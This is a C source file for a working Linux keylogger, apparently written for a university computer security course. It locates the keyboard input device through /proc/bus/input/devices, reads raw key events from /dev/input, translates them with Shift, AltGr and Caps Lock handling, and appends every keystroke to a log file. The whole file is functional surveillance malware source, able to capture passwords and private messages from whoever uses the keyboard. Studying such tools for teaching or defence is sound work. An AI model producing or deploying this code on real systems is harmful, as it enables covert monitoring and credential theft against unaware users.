#include <stdio.h>
#include <fcntl.h>
#include <unistd.h>
#include <linux/input.h>
#include <string.h>
#include <stdlib.h>
#include <errno.h>
#include <ctype.h>

#define LOGFILEPATH "/home/alex/Documentos/Universidad/Seguridad_Informatica/keylogger/keylogger.txt"

char *getEvent();
char getKeyChar(int keycode, int shift, int altGr, int capsLock);
void handleSpecialKeys(int keycode, int value, int *shift, int *altGr, int *capsLock);

int main() {
    struct input_event ev;
    static char path_keyboard[20] = "/dev/input/";
    strcat(path_keyboard, getEvent());
    path_keyboard[strlen(path_keyboard) - 1] = 0;

    int device_keyboard = open(path_keyboard, O_RDONLY);
    if (device_keyboard == -1) {
        perror("Error opening device");
        exit(EXIT_FAILURE);
    }

    FILE *fp = fopen(LOGFILEPATH, "a");
    if (fp == NULL) {
        perror("Error opening log file");
        close(device_keyboard);
        exit(EXIT_FAILURE);
    }

    int shift = 0;
    int altGr = 0;
    int capsLock = 0;

    while (1) {
        ssize_t bytesRead = read(device_keyboard, &ev, sizeof(ev));
        if (bytesRead < 0) {
            perror("Error reading from device");
            break;
        }

        if (ev.type == EV_KEY) {
            handleSpecialKeys(ev.code, ev.value, &shift, &altGr, &capsLock);
            if (ev.value == 0) { // Key release
                char keyChar = getKeyChar(ev.code, shift, altGr, capsLock);
                if (keyChar != '\0') {
                    if (keyChar == '\b') {
                        fseek(fp, -1, SEEK_CUR);
                        fprintf(fp, " ");
                        fseek(fp, -1, SEEK_CUR);
                    } else {
                        fprintf(fp, "%c", keyChar);
                    }
                    fflush(fp);
                }
            }
        }
    }

    close(device_keyboard);
    fclose(fp);
    return 0;
}

char *getEvent() {
    char *command = (char *) "cat /proc/bus/input/devices | grep -C 5 KB | grep -E -o 'event[0-9]'";
    static char event[8];
    FILE *pipe = popen(command, "r");
    if (!pipe)
        exit(1);
    fgets(event, 8, pipe);
    pclose(pipe);
    return event;
}

char getKeyChar(int keycode, int shift, int altGr, int capsLock) {
    char key = '\0';
    switch (keycode) {
        case KEY_A: key = 'a'; break;
        case KEY_B: key = 'b'; break;
        case KEY_C: key = 'c'; break;
        case KEY_D: key = 'd'; break;
        case KEY_E: key = 'e'; break;
        case KEY_F: key = 'f'; break;
        case KEY_G: key = 'g'; break;
        case KEY_H: key = 'h'; break;
        case KEY_I: key = 'i'; break;
        case KEY_J: key = 'j'; break;
        case KEY_K: key = 'k'; break;
        case KEY_L: key = 'l'; break;
        case KEY_M: key = 'm'; break;
        case KEY_N: key = 'n'; break;
        case KEY_O: key = 'o'; break;
        case KEY_P: key = 'p'; break;
        case KEY_Q: key = 'q'; break;
        case KEY_R: key = 'r'; break;
        case KEY_S: key = 's'; break;
        case KEY_T: key = 't'; break;
        case KEY_U: key = 'u'; break;
        case KEY_V: key = 'v'; break;
        case KEY_W: key = 'w'; break;
        case KEY_X: key = 'x'; break;
        case KEY_Y: key = 'y'; break;
        case KEY_Z: key = 'z'; break;
        case KEY_1: key = '1'; break;
        case KEY_2: key = '2'; break;
        case KEY_3: key = '3'; break;
        case KEY_4: key = '4'; break;
        case KEY_5: key = '5'; break;
        case KEY_6: key = '6'; break;
        case KEY_7: key = '7'; break;
        case KEY_8: key = '8'; break;
        case KEY_9: key = '9'; break;
        case KEY_0: key = '0'; break;
        case KEY_SPACE: key = ' '; break;
        case KEY_ENTER: key = '\n'; break;
        case KEY_BACKSPACE: key = '\b'; break;
        case KEY_MINUS: key = '-'; break;
        case KEY_EQUAL: key = '='; break;
        case KEY_LEFTBRACE: key = '['; break;
        case KEY_RIGHTBRACE: key = ']'; break;
        case KEY_BACKSLASH: key = '\\'; break;
        case KEY_SEMICOLON: key = ';'; break;
        case KEY_APOSTROPHE: key = '\''; break;
        case KEY_GRAVE: key = '`'; break;
        case KEY_COMMA: key = ','; break;
        case KEY_DOT: key = '.'; break;
        case KEY_SLASH: key = '/'; break;
        default: key = '\0'; break;
    }

    // Caracteres con Shift
    if (shift) {
        if (key >= 'a' && key <= 'z') key = key - 'a' + 'A';
        switch (keycode) {
            case KEY_1: key = '!'; break;
            case KEY_2: key = '"'; break;
            case KEY_3: key = '#'; break;
            case KEY_4: key = '$'; break;
            case KEY_5: key = '%'; break;
            case KEY_6: key = '&'; break;
            case KEY_7: key = '/'; break;
            case KEY_8: key = '('; break;
            case KEY_9: key = ')'; break;
            case KEY_0: key = '='; break;
            case KEY_MINUS: key = '_'; break;
            case KEY_EQUAL: key = '+'; break;
            case KEY_LEFTBRACE: key = '{'; break;
            case KEY_RIGHTBRACE: key = '}'; break;
            case KEY_BACKSLASH: key = '|'; break;
            case KEY_SEMICOLON: key = ':'; break;
            case KEY_APOSTROPHE: key = '"'; break;
            case KEY_GRAVE: key = '~'; break;
            case KEY_COMMA: key = '<'; break;
            case KEY_DOT: key = '>'; break;
            case KEY_SLASH: key = '?'; break;
        }
    }

    // Caracteres con AltGr
    if (altGr) {
        switch (keycode) {
            case KEY_Q: key = '@'; break;
            // Otros casos que consideres necesarios para tu teclado
        }
    }

    // Manejar Caps Lock
    if (capsLock && key >= 'a' && key <= 'z') key = key - 'a' + 'A';

    return key;
}

void handleSpecialKeys(int keycode, int value, int *shift, int *altGr, int *capsLock) {
    if (keycode == KEY_LEFTSHIFT || keycode == KEY_RIGHTSHIFT) {
        *shift = value;
    } else if (keycode == KEY_RIGHTALT) {
        *altGr = value;
    } else if (keycode == KEY_CAPSLOCK && value == 0) {
        *capsLock = !(*capsLock);
    }
}
